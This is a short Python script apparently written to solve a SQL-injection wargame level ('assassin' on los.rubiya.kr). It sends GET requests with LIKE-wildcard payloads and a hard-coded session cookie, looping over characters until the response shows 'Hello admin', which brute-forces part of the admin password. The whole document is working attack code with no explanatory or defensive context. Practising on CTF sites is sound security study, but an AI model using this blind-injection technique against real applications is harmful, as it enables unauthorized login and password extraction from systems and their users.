import requests

target = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies = {"PHPSESSID": "q6g6gipia2tga8jpt11pvvanrb"}


pw = ''

ds = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']



for i in ds:
	pay = f"?pw=__{i}%"
	res = requests.get(target + pay, cookies=cookies)
	if "Hello admin" in res.text:
	    print(i)
	    break